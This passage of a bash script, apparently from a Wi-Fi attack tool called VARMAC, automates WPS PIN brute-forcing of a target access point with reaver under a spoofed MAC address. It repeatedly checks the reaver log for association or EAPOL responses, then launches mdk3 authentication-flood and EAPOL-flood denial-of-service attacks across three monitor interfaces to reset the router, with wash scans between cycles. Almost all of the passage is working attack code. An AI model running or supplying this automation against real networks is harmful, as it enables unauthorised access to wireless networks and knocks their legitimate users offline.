contents=$(cat "VARMAC_LOGS/$NAME1-$DATEFILE-$PAD")
case $contents in
	*"$EAPOL"*)
	LINECAP=1

         esac

##########################
if [ $LINECAP -eq 2 ]; then 
	tput rc
	tput ed
	echo " "
	echo -e "$info  9. Reading VARMAC_LOGS/$NAME1-$DATEFILE-$PAD for AP association."
	sleep $LIVEDIV

           fi

if [ $LINECAP -eq 2 ]; then

while read line

	do

	 if [[ $line == "[+] Associated with $TARGETAP1 (ESSID: $NMEWARN1)" ]] || [[ $line == "YYY11" ]] || [[ $line == "YYY12" ]] || [[ $line == "YYY13" ]] || [[ $line == "YYY14" ]] || [[ $line == "YYY15" ]]; then 

                    LINECAP=1 # old let

		fi

#echo "9. Reading file for AP association."

done < VARMAC_LOGS/$NAME1-$DATEFILE-$PAD

                   fi

contents=$(cat "VARMAC_LOGS/$NAME1-$DATEFILE-$PAD")
case $contents in
	*"$EAPOL"*)
	LINECAP=1

         esac

##########################
if [ $LINECAP -eq 2 ]; then 
	tput rc
	tput ed
	echo " "
	echo -e "$info  10. Reading$yel VARMAC_LOGS/$NAME1-$DATEFILE-$PAD$info for AP association."
	sleep $LIVEDIV

           fi

if [ $LINECAP -eq 2 ]; then

while read line

	do

	 if [[ $line == "[+] Associated with $TARGETAP1 (ESSID: $NMEWARN1)" ]] || [[ $line == "YYY11" ]] || [[ $line == "YYY12" ]] || [[ $line == "YYY13" ]] || [[ $line == "YYY14" ]] || [[ $line == "YYY15" ]]; then 

                    LINECAP=1 # old let

		fi

#echo "10. Reading file for AP association."

done < VARMAC_LOGS/$NAME1-$DATEFILE-$PAD

                   fi

contents=$(cat "VARMAC_LOGS/$NAME1-$DATEFILE-$PAD")
case $contents in
	*"$EAPOL"*)
	LINECAP=1

         esac

if [[ $DAMP_MDK == y || $DAMP_MDK == Y ]] && [[ $LINECAP -eq 2 ]] ; then	

			OVERRIDE_MDK3=y

				fi

##########################
# Add more scan modules here in sets of division of ADVAN_LIVE

############################

		fi  # Linked to=if [[ $ADVANMON == y ]] || [[ $ADVANMON == Y ]]; then

############################ End of Advanced monitering #########################

if  [[ $REAVER_COUNT == y || $REAVER_COUNT == Y ]] && [[ $OVERRIDE_MDK3 == n ]]; then

seconds=$LIVE1; date1=$((`date +%s` + $seconds)); 

while [ "$date1" -ne `date +%s` ]; do 
echo -ne "$info ADVAN_TIME expired or router response seen. Time before mdk3 start. $yel $(date -u --date @$(($date1 - `date +%s` )) +%H:%M:%S)\r"; 

	done

		fi

if  [[ $REAVER_COUNT == n || $REAVER_COUNT == N ]] && [[ $OVERRIDE_MDK3 == n ]]; then

		echo " "
		echo -e " ADVAN_TIME expired or router response seen - reaver will run for$yel $LIVE1$info sec before starting mdk3!"
		sleep $LIVE1

		fi

echo -e "$txtrst"

PIDREV=$(airmon-ng check | grep "reaver" | sed s/"(reaver) is running on interface $MON"//g)
#
PIDREV1=${PIDREV##*D }
#
kill -s SIGINT $PIDREV1

sleep 2
killall -q Eterm &> /dev/null
clear
	fi

#######################

if [[ $USE_R1 == n || $USE_R1 == N ]] && [[ $USE_LONG1 == y || $USE_LONG1 == Y ]] && [[ $USE_PIN1 == y || $USE_PIN1 == Y ]] && [[ $CHANNEL1 == 0 ]]; then

echo -e " "
echo -e "$info             Starting Reaver"
echo -e "$info TargetAP Name                      = $yel$NMEWARN1"
echo -e "$info Monitor                            = $yel$MON"
echo -e "$info Channel(note 0 = channel hopping)  = $yel$CHANNEL1"
echo -e "$info Mac code of Target AP              = $yel$TARGETAP1"
echo -e "$info Random Mac code                    = $yel$VARMAC"
echo -e "$info Reaver live time                   = $yel$LIVE1$info sec"
echo -e "$info Reaver start/stop cycles remaining = $yel$COUNT"
echo -e "$info Text Log  in  /root/VARMAC_LOGS    = $yel$NAME1-$DATEFILE-$PAD"

echo -e "$txtrst"

Eterm -g 80x10-1+100 --cmod "red" -T "Reaver7h" -e sh -c "reaver -i $MON -a -b $TARGETAP1 -L -E -vv -N -T 1 -t 20 -d 0  -x 30 --pin=$WPS_PIN1 --mac=$VARMAC 2>&1 | tee VARMAC_LOGS/$NAME1-$DATEFILE-$PAD" &

echo -e "$info Router Pause/Recovery Time         = $yel$PAUSE$info sec"
echo -e "$info MDK3 Attack Time                   = $yel$MDKLIVE$info sec"
echo -e " "
echo -e "$warn Monitor WPS Pin Collection - Adjust Reaver Live Time Accordingly!!!$txtrst"
echo -e ""

#######DETERMINE WPS LOCKED-NO ASSOC BEGIN ########
# Divide time to take file snaps every 1/5 LIVE time to avoid subprocess hang with tail.
LIVEDIV=$(((($ADVAN_TIME-60))/8))
LINECAP=2 # Set line capture switch

if [[ $ADVANMON == y ]] || [[ $ADVANMON == Y ]]; then

if [ $LINECAP -eq 2 ]; then 
	tput sc
	echo " "
	echo -e "$info  1. Reading VARMAC_LOGS/$NAME1-$DATEFILE-$PAD for AP association."
	sleep 30

           fi

if [ $LINECAP -eq 2 ]; then

while read line

	do

	 if [[ $line == "[+] Associated with $TARGETAP1 (ESSID: $NMEWARN1)" ]] || [[ $line == "YYY11" ]] || [[ $line == "YYY12" ]] || [[ $line == "YYY13" ]] || [[ $line == "YYY14" ]] || [[ $line == "YYY15" ]]; then 

                    LINECAP=1 # old let

		fi

#echo "1. Reading file for AP association."

done < VARMAC_LOGS/$NAME1-$DATEFILE-$PAD

                   fi

contents=$(cat "VARMAC_LOGS/$NAME1-$DATEFILE-$PAD")
case $contents in
	*"$EAPOL"*)
	LINECAP=1

         esac

##########################

if [ $LINECAP -eq 2 ]; then 
	tput rc
	tput ed
	echo " "
	echo -e "$info  2. Reading$yel VARMAC_LOGS/$NAME1-$DATEFILE-$PAD$info for AP association."
	sleep 30

           fi

if [ $LINECAP -eq 2 ]; then

while read line

	do

	 if [[ $line == "[+] Associated with $TARGETAP1 (ESSID: $NMEWARN1)" ]] || [[ $line == "YYY11" ]] || [[ $line == "YYY12" ]] || [[ $line == "YYY13" ]] || [[ $line == "YYY14" ]] || [[ $line == "YYY15" ]]; then 

                    LINECAP=1 # old let

		fi

#echo "2. Reading file for AP association."

done < VARMAC_LOGS/$NAME1-$DATEFILE-$PAD

                   fi

contents=$(cat "VARMAC_LOGS/$NAME1-$DATEFILE-$PAD")
case $contents in
	*"$EAPOL"*)
	LINECAP=1

         esac

##########################
if [ $LINECAP -eq 2 ]; then 
	tput rc
	tput ed
	echo " "
	echo -e "$info  3. Reading VARMAC_LOGS/$NAME1-$DATEFILE-$PAD for AP association."
	sleep $LIVEDIV

           fi

if [ $LINECAP -eq 2 ]; then

while read line

	do

	 if [[ $line == "[+] Associated with $TARGETAP1 (ESSID: $NMEWARN1)" ]] || [[ $line == "YYY11" ]] || [[ $line == "YYY12" ]] || [[ $line == "YYY13" ]] || [[ $line == "YYY14" ]] || [[ $line == "YYY15" ]]; then 

                    LINECAP=1 # old let

		fi

#echo "3. Reading file for AP association."

done < VARMAC_LOGS/$NAME1-$DATEFILE-$PAD

                   fi

contents=$(cat "VARMAC_LOGS/$NAME1-$DATEFILE-$PAD")
case $contents in
	*"$EAPOL"*)
	LINECAP=1

         esac

##########################
if [ $LINECAP -eq 2 ]; then 
	tput rc
	tput ed
	echo " "
	echo -e "$info  4. Reading$yel VARMAC_LOGS/$NAME1-$DATEFILE-$PAD$info for AP association."
	sleep $LIVEDIV

           fi

if [ $LINECAP -eq 2 ]; then

while read line

	do

	 if [[ $line == "[+] Associated with $TARGETAP1 (ESSID: $NMEWARN1)" ]] || [[ $line == "YYY11" ]] || [[ $line == "YYY12" ]] || [[ $line == "YYY13" ]] || [[ $line == "YYY14" ]] || [[ $line == "YYY15" ]]; then 

                    LINECAP=1 # old let

		fi

#echo "4. Reading file for AP association."

done < VARMAC_LOGS/$NAME1-$DATEFILE-$PAD

                   fi

contents=$(cat "VARMAC_LOGS/$NAME1-$DATEFILE-$PAD")
case $contents in
	*"$EAPOL"*)
	LINECAP=1

         esac

##########################
if [ $LINECAP -eq 2 ]; then 
	tput rc
	tput ed	
	echo " "
	echo -e "$info  5. Reading VARMAC_LOGS/$NAME1-$DATEFILE-$PAD for AP association."
	sleep $LIVEDIV

           fi

if [ $LINECAP -eq 2 ]; then

while read line

	do

	 if [[ $line == "[+] Associated with $TARGETAP1 (ESSID: $NMEWARN1)" ]] || [[ $line == "YYY11" ]] || [[ $line == "YYY12" ]] || [[ $line == "YYY13" ]] || [[ $line == "YYY14" ]] || [[ $line == "YYY15" ]]; then 

                    LINECAP=1 # old let

		fi

#echo "5. Reading file for AP association."

done < VARMAC_LOGS/$NAME1-$DATEFILE-$PAD

                   fi

contents=$(cat "VARMAC_LOGS/$NAME1-$DATEFILE-$PAD")
case $contents in
	*"$EAPOL"*)
	LINECAP=1

         esac

##########################
if [ $LINECAP -eq 2 ]; then 
	tput rc
	tput ed	
	echo " "
	echo -e "$info  6. Reading$yel VARMAC_LOGS/$NAME1-$DATEFILE-$PAD$info for AP association."
	sleep $LIVEDIV

           fi

if [ $LINECAP -eq 2 ]; then

while read line

	do

	 if [[ $line == "[+] Associated with $TARGETAP1 (ESSID: $NMEWARN1)" ]] || [[ $line == "YYY11" ]] || [[ $line == "YYY12" ]] || [[ $line == "YYY13" ]] || [[ $line == "YYY14" ]] || [[ $line == "YYY15" ]]; then 

                    LINECAP=1 # old let

		fi

#echo "6. Reading file for AP association."

done < VARMAC_LOGS/$NAME1-$DATEFILE-$PAD

                   fi

contents=$(cat "VARMAC_LOGS/$NAME1-$DATEFILE-$PAD")
case $contents in
	*"$EAPOL"*)
	LINECAP=1

         esac

##########################
if [ $LINECAP -eq 2 ]; then 
	tput rc
	tput ed
	echo " "
	echo -e "$info  7. Reading VARMAC_LOGS/$NAME1-$DATEFILE-$PAD for AP association."
	sleep $LIVEDIV

           fi

if [ $LINECAP -eq 2 ]; then

while read line

	do

	 if [[ $line == "[+] Associated with $TARGETAP1 (ESSID: $NMEWARN1)" ]] || [[ $line == "YYY11" ]] || [[ $line == "YYY12" ]] || [[ $line == "YYY13" ]] || [[ $line == "YYY14" ]] || [[ $line == "YYY15" ]]; then 

                    LINECAP=1 # old let

		fi

#echo "7. Reading file for AP association."

done < VARMAC_LOGS/$NAME1-$DATEFILE-$PAD

                   fi

contents=$(cat "VARMAC_LOGS/$NAME1-$DATEFILE-$PAD")
case $contents in
	*"$EAPOL"*)
	LINECAP=1

         esac

##########################
if [ $LINECAP -eq 2 ]; then 
	tput rc
	tput ed
	echo " "
	echo -e "$info  8. Reading$yel VARMAC_LOGS/$NAME1-$DATEFILE-$PAD$info for AP association."
	sleep $LIVEDIV

           fi

if [ $LINECAP -eq 2 ]; then

while read line

	do

	 if [[ $line == "[+] Associated with $TARGETAP1 (ESSID: $NMEWARN1)" ]] || [[ $line == "YYY11" ]] || [[ $line == "YYY12" ]] || [[ $line == "YYY13" ]] || [[ $line == "YYY14" ]] || [[ $line == "YYY15" ]]; then 

                    LINECAP=1 # old let

		fi

#echo "8. Reading file for AP association."

done < VARMAC_LOGS/$NAME1-$DATEFILE-$PAD

                   fi

contents=$(cat "VARMAC_LOGS/$NAME1-$DATEFILE-$PAD")
case $contents in
	*"$EAPOL"*)
	LINECAP=1

         esac

##########################
if [ $LINECAP -eq 2 ]; then 
	tput rc
	tput ed
	echo " "
	echo -e "$info  9. Reading VARMAC_LOGS/$NAME1-$DATEFILE-$PAD for AP association."
	sleep $LIVEDIV

           fi

if [ $LINECAP -eq 2 ]; then

while read line

	do

	 if [[ $line == "[+] Associated with $TARGETAP1 (ESSID: $NMEWARN1)" ]] || [[ $line == "YYY11" ]] || [[ $line == "YYY12" ]] || [[ $line == "YYY13" ]] || [[ $line == "YYY14" ]] || [[ $line == "YYY15" ]]; then 

                    LINECAP=1 # old let

		fi

#echo "9. Reading file for AP association."

done < VARMAC_LOGS/$NAME1-$DATEFILE-$PAD

                   fi

contents=$(cat "VARMAC_LOGS/$NAME1-$DATEFILE-$PAD")
case $contents in
	*"$EAPOL"*)
	LINECAP=1

         esac

##########################
if [ $LINECAP -eq 2 ]; then 
	tput rc
	tput ed
	echo " "
	echo -e "$info  10. Reading$yel VARMAC_LOGS/$NAME1-$DATEFILE-$PAD$info for AP association."
	sleep $LIVEDIV

           fi

if [ $LINECAP -eq 2 ]; then

while read line

	do

	 if [[ $line == "[+] Associated with $TARGETAP1 (ESSID: $NMEWARN1)" ]] || [[ $line == "YYY11" ]] || [[ $line == "YYY12" ]] || [[ $line == "YYY13" ]] || [[ $line == "YYY14" ]] || [[ $line == "YYY15" ]]; then 

                    LINECAP=1 # old let

		fi

#echo "10. Reading file for AP association."

done < VARMAC_LOGS/$NAME1-$DATEFILE-$PAD

                   fi

contents=$(cat "VARMAC_LOGS/$NAME1-$DATEFILE-$PAD")
case $contents in
	*"$EAPOL"*)
	LINECAP=1

         esac

if [[ $DAMP_MDK == y || $DAMP_MDK == Y ]] && [[ $LINECAP -eq 2 ]] ; then	

			OVERRIDE_MDK3=y

				fi

##########################
# Add more scan modules here in sets of division of ADVAN_LIVE

############################

		fi  # Linked to=if [[ $ADVANMON == y ]] || [[ $ADVANMON == Y ]]; then

############################ End of Advanced monitering #########################

if  [[ $REAVER_COUNT == y || $REAVER_COUNT == Y ]] && [[ $OVERRIDE_MDK3 == n ]]; then

seconds=$LIVE1; date1=$((`date +%s` + $seconds)); 

while [ "$date1" -ne `date +%s` ]; do 
echo -ne "$info ADVAN_TIME expired or router response seen. Time before mdk3 start. $yel $(date -u --date @$(($date1 - `date +%s` )) +%H:%M:%S)\r"; 

	done

		fi

if  [[ $REAVER_COUNT == n || $REAVER_COUNT == N ]] && [[ $OVERRIDE_MDK3 == n ]]; then

		echo " "
		echo -e " ADVAN_TIME expired or router response seen - reaver will run for$yel $LIVE1$info sec before starting mdk3!"
		sleep $LIVE1

		fi

echo -e "$txtrst"

PIDREV=$(airmon-ng check | grep "reaver" | sed s/"(reaver) is running on interface $MON"//g)
#
PIDREV1=${PIDREV##*D }
#
kill -s SIGINT $PIDREV1

sleep 2
killall -q Eterm &> /dev/null
clear
	fi

###################

if [[ $USE_R1 == y || $USE_R1 == Y ]] && [[ $USE_LONG1 == y || $USE_LONG1 == Y ]] && [[ $USE_PIN1 == y || $USE_PIN1 == Y ]] && [[ $CHANNEL1 == 0 ]]; then

echo -e " "
echo -e "$info             Starting Reaver"
echo -e "$info TargetAP Name                      = $yel$NMEWARN1"
echo -e "$info Monitor                            = $yel$MON"
echo -e "$info Channel(note 0 = channel hopping)  = $yel$CHANNEL1"
echo -e "$info Mac code of Target AP              = $yel$TARGETAP1"
echo -e "$info Random Mac code                    = $yel$VARMAC"
echo -e "$info Recurring-delay pin attempts x     = $yel$RX1" 
echo -e "$info Recurring-delay sleep in sec y     = $yel$RY1"
echo -e "$info Reaver live time                   = $yel$LIVE1$info sec"
echo -e "$info Reaver start/stop cycles remaining = $yel$COUNT"
echo -e "$info Text Log  in  /root/VARMAC_LOGS    = $yel$NAME1-$DATEFILE-$PAD"

echo -e "$txtrst"

Eterm -g 80x10-1+100 --cmod "red" -T "Reaver8h" -e sh -c "reaver -i $MON -a -b $TARGETAP1 -r $RX1:$RY1 -L -E -vv -N -T 1 -t 20 -d 0  -x 30 --pin=$WPS_PIN1 --mac=$VARMAC 2>&1 | tee VARMAC_LOGS/$NAME1-$DATEFILE-$PAD" &

echo -e "$info Router Pause/Recovery Time         = $yel$PAUSE$info sec"
echo -e "$info MDK3 Attack Time                   = $yel$MDKLIVE$info sec"
echo -e " "
echo -e "$warn Monitor WPS Pin Collection - Adjust Reaver Live Time Accordingly!!!$txtrst"
echo -e ""

#######DETERMINE WPS LOCKED-NO ASSOC BEGIN ########
# Divide time to take file snaps every 1/5 LIVE time to avoid subprocess hang with tail.
LIVEDIV=$(((($ADVAN_TIME-60))/8))
LINECAP=2 # Set line capture switch

if [[ $ADVANMON == y ]] || [[ $ADVANMON == Y ]]; then

if [ $LINECAP -eq 2 ]; then 
	tput sc
	echo " "
	echo -e "$info  1. Reading VARMAC_LOGS/$NAME1-$DATEFILE-$PAD for AP association."
	sleep 30

           fi

if [ $LINECAP -eq 2 ]; then

while read line

	do

	 if [[ $line == "[+] Associated with $TARGETAP1 (ESSID: $NMEWARN1)" ]] || [[ $line == "YYY11" ]] || [[ $line == "YYY12" ]] || [[ $line == "YYY13" ]] || [[ $line == "YYY14" ]] || [[ $line == "YYY15" ]]; then 

                    LINECAP=1 # old let

		fi

#echo "1. Reading file for AP association."

done < VARMAC_LOGS/$NAME1-$DATEFILE-$PAD

                   fi

contents=$(cat "VARMAC_LOGS/$NAME1-$DATEFILE-$PAD")
case $contents in
	*"$EAPOL"*)
	LINECAP=1

         esac

##########################

if [ $LINECAP -eq 2 ]; then 
	tput rc
	tput ed
	echo " "
	echo -e "$info  2. Reading$yel VARMAC_LOGS/$NAME1-$DATEFILE-$PAD$info for AP association."
	sleep 30

           fi

if [ $LINECAP -eq 2 ]; then

while read line

	do

	 if [[ $line == "[+] Associated with $TARGETAP1 (ESSID: $NMEWARN1)" ]] || [[ $line == "YYY11" ]] || [[ $line == "YYY12" ]] || [[ $line == "YYY13" ]] || [[ $line == "YYY14" ]] || [[ $line == "YYY15" ]]; then 

                    LINECAP=1 # old let

		fi

#echo "2. Reading file for AP association."

done < VARMAC_LOGS/$NAME1-$DATEFILE-$PAD

                   fi

contents=$(cat "VARMAC_LOGS/$NAME1-$DATEFILE-$PAD")
case $contents in
	*"$EAPOL"*)
	LINECAP=1

         esac

##########################
if [ $LINECAP -eq 2 ]; then 
	tput rc
	tput ed
	echo " "
	echo -e "$info  3. Reading VARMAC_LOGS/$NAME1-$DATEFILE-$PAD for AP association."
	sleep $LIVEDIV

           fi

if [ $LINECAP -eq 2 ]; then

while read line

	do

	 if [[ $line == "[+] Associated with $TARGETAP1 (ESSID: $NMEWARN1)" ]] || [[ $line == "YYY11" ]] || [[ $line == "YYY12" ]] || [[ $line == "YYY13" ]] || [[ $line == "YYY14" ]] || [[ $line == "YYY15" ]]; then 

                    LINECAP=1 # old let

		fi

#echo "3. Reading file for AP association."

done < VARMAC_LOGS/$NAME1-$DATEFILE-$PAD

                   fi

contents=$(cat "VARMAC_LOGS/$NAME1-$DATEFILE-$PAD")
case $contents in
	*"$EAPOL"*)
	LINECAP=1

         esac

##########################
if [ $LINECAP -eq 2 ]; then 
	tput rc
	tput ed
	echo " "
	echo -e "$info  4. Reading$yel VARMAC_LOGS/$NAME1-$DATEFILE-$PAD$info for AP association."
	sleep $LIVEDIV

           fi

if [ $LINECAP -eq 2 ]; then

while read line

	do

	 if [[ $line == "[+] Associated with $TARGETAP1 (ESSID: $NMEWARN1)" ]] || [[ $line == "YYY11" ]] || [[ $line == "YYY12" ]] || [[ $line == "YYY13" ]] || [[ $line == "YYY14" ]] || [[ $line == "YYY15" ]]; then 

                    LINECAP=1 # old let

		fi

#echo "4. Reading file for AP association."

done < VARMAC_LOGS/$NAME1-$DATEFILE-$PAD

                   fi

contents=$(cat "VARMAC_LOGS/$NAME1-$DATEFILE-$PAD")
case $contents in
	*"$EAPOL"*)
	LINECAP=1

         esac

##########################
if [ $LINECAP -eq 2 ]; then 
	tput rc
	tput ed	
	echo " "
	echo -e "$info  5. Reading VARMAC_LOGS/$NAME1-$DATEFILE-$PAD for AP association."
	sleep $LIVEDIV

           fi

if [ $LINECAP -eq 2 ]; then

while read line

	do

	 if [[ $line == "[+] Associated with $TARGETAP1 (ESSID: $NMEWARN1)" ]] || [[ $line == "YYY11" ]] || [[ $line == "YYY12" ]] || [[ $line == "YYY13" ]] || [[ $line == "YYY14" ]] || [[ $line == "YYY15" ]]; then 

                    LINECAP=1 # old let

		fi

#echo "5. Reading file for AP association."

done < VARMAC_LOGS/$NAME1-$DATEFILE-$PAD

                   fi

contents=$(cat "VARMAC_LOGS/$NAME1-$DATEFILE-$PAD")
case $contents in
	*"$EAPOL"*)
	LINECAP=1

         esac

##########################
if [ $LINECAP -eq 2 ]; then 
	tput rc
	tput ed	
	echo " "
	echo -e "$info  6. Reading$yel VARMAC_LOGS/$NAME1-$DATEFILE-$PAD$info for AP association."
	sleep $LIVEDIV

           fi

if [ $LINECAP -eq 2 ]; then

while read line

	do

	 if [[ $line == "[+] Associated with $TARGETAP1 (ESSID: $NMEWARN1)" ]] || [[ $line == "YYY11" ]] || [[ $line == "YYY12" ]] || [[ $line == "YYY13" ]] || [[ $line == "YYY14" ]] || [[ $line == "YYY15" ]]; then 

                    LINECAP=1 # old let

		fi

#echo "6. Reading file for AP association."

done < VARMAC_LOGS/$NAME1-$DATEFILE-$PAD

                   fi

contents=$(cat "VARMAC_LOGS/$NAME1-$DATEFILE-$PAD")
case $contents in
	*"$EAPOL"*)
	LINECAP=1

         esac

##########################
if [ $LINECAP -eq 2 ]; then 
	tput rc
	tput ed
	echo " "
	echo -e "$info  7. Reading VARMAC_LOGS/$NAME1-$DATEFILE-$PAD for AP association."
	sleep $LIVEDIV

           fi

if [ $LINECAP -eq 2 ]; then

while read line

	do

	 if [[ $line == "[+] Associated with $TARGETAP1 (ESSID: $NMEWARN1)" ]] || [[ $line == "YYY11" ]] || [[ $line == "YYY12" ]] || [[ $line == "YYY13" ]] || [[ $line == "YYY14" ]] || [[ $line == "YYY15" ]]; then 

                    LINECAP=1 # old let

		fi

#echo "7. Reading file for AP association."

done < VARMAC_LOGS/$NAME1-$DATEFILE-$PAD

                   fi

contents=$(cat "VARMAC_LOGS/$NAME1-$DATEFILE-$PAD")
case $contents in
	*"$EAPOL"*)
	LINECAP=1

         esac

##########################
if [ $LINECAP -eq 2 ]; then 
	tput rc
	tput ed
	echo " "
	echo -e "$info  8. Reading$yel VARMAC_LOGS/$NAME1-$DATEFILE-$PAD$info for AP association."
	sleep $LIVEDIV

           fi

if [ $LINECAP -eq 2 ]; then

while read line

	do

	 if [[ $line == "[+] Associated with $TARGETAP1 (ESSID: $NMEWARN1)" ]] || [[ $line == "YYY11" ]] || [[ $line == "YYY12" ]] || [[ $line == "YYY13" ]] || [[ $line == "YYY14" ]] || [[ $line == "YYY15" ]]; then 

                    LINECAP=1 # old let

		fi

#echo "8. Reading file for AP association."

done < VARMAC_LOGS/$NAME1-$DATEFILE-$PAD

                   fi

contents=$(cat "VARMAC_LOGS/$NAME1-$DATEFILE-$PAD")
case $contents in
	*"$EAPOL"*)
	LINECAP=1

         esac

##########################
if [ $LINECAP -eq 2 ]; then 
	tput rc
	tput ed
	echo " "
	echo -e "$info  9. Reading VARMAC_LOGS/$NAME1-$DATEFILE-$PAD for AP association."
	sleep $LIVEDIV

           fi

if [ $LINECAP -eq 2 ]; then

while read line

	do

	 if [[ $line == "[+] Associated with $TARGETAP1 (ESSID: $NMEWARN1)" ]] || [[ $line == "YYY11" ]] || [[ $line == "YYY12" ]] || [[ $line == "YYY13" ]] || [[ $line == "YYY14" ]] || [[ $line == "YYY15" ]]; then 

                    LINECAP=1 # old let

		fi

#echo "9. Reading file for AP association."

done < VARMAC_LOGS/$NAME1-$DATEFILE-$PAD

                   fi

contents=$(cat "VARMAC_LOGS/$NAME1-$DATEFILE-$PAD")
case $contents in
	*"$EAPOL"*)
	LINECAP=1

         esac

##########################
if [ $LINECAP -eq 2 ]; then 
	tput rc
	tput ed
	echo " "
	echo -e "$info  10. Reading$yel VARMAC_LOGS/$NAME1-$DATEFILE-$PAD$info for AP association."
	sleep $LIVEDIV

           fi

if [ $LINECAP -eq 2 ]; then

while read line

	do

	 if [[ $line == "[+] Associated with $TARGETAP1 (ESSID: $NMEWARN1)" ]] || [[ $line == "YYY11" ]] || [[ $line == "YYY12" ]] || [[ $line == "YYY13" ]] || [[ $line == "YYY14" ]] || [[ $line == "YYY15" ]]; then 

                    LINECAP=1 # old let

		fi

#echo "10. Reading file for AP association."

done < VARMAC_LOGS/$NAME1-$DATEFILE-$PAD

#  Shut down mdk3 if no assoc to router


                   	fi

contents=$(cat "VARMAC_LOGS/$NAME1-$DATEFILE-$PAD")
case $contents in
	*"$EAPOL"*)
	LINECAP=1

         esac

if [[ $DAMP_MDK == y || $DAMP_MDK == Y ]] && [[ $LINECAP -eq 2 ]] ; then	

			OVERRIDE_MDK3=y

				fi

##########################
# Add more scan modules here in sets of division of ADVAN_LIVE

############################

		fi  # Linked to=if [[ $ADVANMON == y ]] || [[ $ADVANMON == Y ]]; then

############################ End of Advanced monitering #########################

if  [[ $REAVER_COUNT == y || $REAVER_COUNT == Y ]] && [[ $OVERRIDE_MDK3 == n ]]; then

seconds=$LIVE1; date1=$((`date +%s` + $seconds)); 

while [ "$date1" -ne `date +%s` ]; do 
echo -ne "$info ADVAN_TIME expired or router response seen. Time before mdk3 start. $yel $(date -u --date @$(($date1 - `date +%s` )) +%H:%M:%S)\r"; 

	done

		fi

if  [[ $REAVER_COUNT == n || $REAVER_COUNT == N ]] && [[ $OVERRIDE_MDK3 == n ]]; then

		echo " "
		echo -e " ADVAN_TIME expired or router response seen - reaver will run for$yel $LIVE1$info sec before starting mdk3!"
		sleep $LIVE1

		fi

echo -e "$txtrst"

PIDREV=$(airmon-ng check | grep "reaver" | sed s/"(reaver) is running on interface $MON"//g)
#
PIDREV1=${PIDREV##*D }
#
kill -s SIGINT $PIDREV1

sleep 2
killall -q Eterm &> /dev/null


clear
	fi

################# Determine to keep file or not ###########

 if [ $KEEP_FILE1 == n ] || [ $KEEP_FILE1 == N ]; then

          rm VARMAC_LOGS/$NAME1-$DATEFILE-$PAD

			fi

################End keep file or ease #####################

####Reload config file####

source /root/VARMAC_CONFIG/$SOURCENAME

	if [ $OVERRIDE_MDK3 == y ]; then	

		MDKLIVE=0		

		fi


#####################Start MDK3 DOS############################

	if [ $MDKTYPE1 == 1 ]; then

Eterm -g 80x10-1+1 --cmod "red" -T "mdk3 DOS 1" -e sh -c "mdk3 $MON a -a  $TARGETAP1 -s 200 -m" & 

sleep 1

Eterm -g 80x10-1+200 --cmod "red" -T "mdk3 DOS 2" -e sh -c "mdk3 $MON1 a -a  $TARGETAP1 -s 200 -m" & 

sleep 1

Eterm -g 80x10-1+400 --cmod "red" -T "mdk3 DOS 3" -e sh -c "mdk3 $MON2 a -a  $TARGETAP1 -s 200 -m" & 

       fi

#####start mdk3 EAPOL #######

	if [ $MDKTYPE1 == 2 ]; then

	Eterm -g 80x10-1+1 --cmod "red" -T "EAPOL Packet Flooding 1" -e sh  -c "mdk3 $MON x 0 -t $TARGETAP1 -n $NAME1 -s 100" &

sleep 1

	Eterm -g 80x10-1+200 --cmod "red" -T "EAPOL Packet Flooding 2" -e sh  -c "mdk3 $MON1 x 0 -t $TARGETAP1 -n $NAME1 -s 100" &

sleep 1

	Eterm -g 80x10-1+400 --cmod "red" -T "EAPOL Packet Flooding 3" -e sh  -c "mdk3 $MON2 x 0 -t $TARGETAP1 -n $NAME1 -s 100" &

	fi

#####Start mdk3 combined DOS Heavy ###### 

	if [ $MDKTYPE1 == 3 ]; then

Eterm -g 80x10-1+1 --cmod "red" -T "mdk3 DOS 1" -e sh -c "mdk3 $MON a -a  $TARGETAP1 -s 200 -m" & 

sleep 1

Eterm -g 80x10-1+200 --cmod "red" -T "mdk3 DOS 2" -e sh -c "mdk3 $MON1 a -a  $TARGETAP1 -s 200 -m" & 

sleep 1

	Eterm -g 80x10-1+400 --cmod "red" -T "EAPOL Packet Flooding 3" -e sh  -c "mdk3 $MON2 x 0 -t $TARGETAP1 -n $NAME1 -s 100" &

	fi      

#####Start mdk3 combined heavy on EAPOL ###### 

	if [ $MDKTYPE1 == 4 ]; then

Eterm -g 80x10-1+1 --cmod "red" -T "mdk3 DOS 1" -e sh -c "mdk3 $MON a -a  $TARGETAP1 -s 200 -m" & 

sleep 1

	Eterm -g 80x10-1+200 --cmod "red" -T "EAPOL Packet Flooding 2" -e sh  -c "mdk3 $MON1 x 0 -t $TARGETAP1 -n $NAME1 -s 100" &

sleep 1

	Eterm -g 80x10-1+400 --cmod "red" -T "EAPOL Packet Flooding 3" -e sh  -c "mdk3 $MON2 x 0 -t $TARGETAP1 -n $NAME1 -s 100" &

	fi      

if [ $OVERRIDE_MDK3 == n ]; then

	echo -e " "
	echo -e "$info MDK3 Attack Type $yel$MDKTYPE1$info is Starting"
        echo -e " "
	echo -e "$info Router Pause/Recovery Time = $yel$PAUSE$info sec"
        echo -e "$info REAVER Live Time           = $yel$LIVE1$info sec"
	echo -e "$info MDK3 Attack Time           = $yel$MDKLIVE$info sec"
	echo -e " "

if  [ $MDK3_COUNT == y ] || [ $MDK3_COUNT == Y ]; then

seconds=$MDKLIVE; date1=$((`date +%s` + $seconds)); 

while [ "$date1" -ne `date +%s` ]; do 
echo -ne "$info  Time before Router Recovery Time and Wash scan $yel $(date -u --date @$(($date1 - `date +%s` )) +%H:%M:%S)\r"; 

	done
		fi

if  [ $MDK3_COUNT == n ] || [ $MDK3_COUNT == N ]; then

sleep $MDKLIVE

		fi
			fi

echo -e "$txtrst "

killall -q reaver &> /dev/null 
killall -q mdk3 &> /dev/null
killall -q Eterm &> /dev/null
clear
sleep 2

####reload config file

source /root/VARMAC_CONFIG/$SOURCENAME

####

Eterm -g 100x30-1+1 --cmod "red" -T "wash" -e sh -c "wash -i $MON" & 

sleep 1
	echo -e " " 
	echo -e "$info Router Pause Recovery with Wash Scan is Starting."
	echo -e " "
	echo -e "$info Router Pause/Recovery Time = $yel$PAUSE$info sec"
        echo -e "$info REAVER Live Time           = $yel$LIVE1$info sec"
	echo -e "$info MDK3 Attack Time           = $yel$MDKLIVE$info sec"
	echo -e " "

if  [ $WASH_COUNT == y ] || [ $WASH_COUNT == Y ]; then

seconds=$PAUSE; date1=$((`date +%s` + $seconds)); 

while [ "$date1" -ne `date +%s` ]; do 
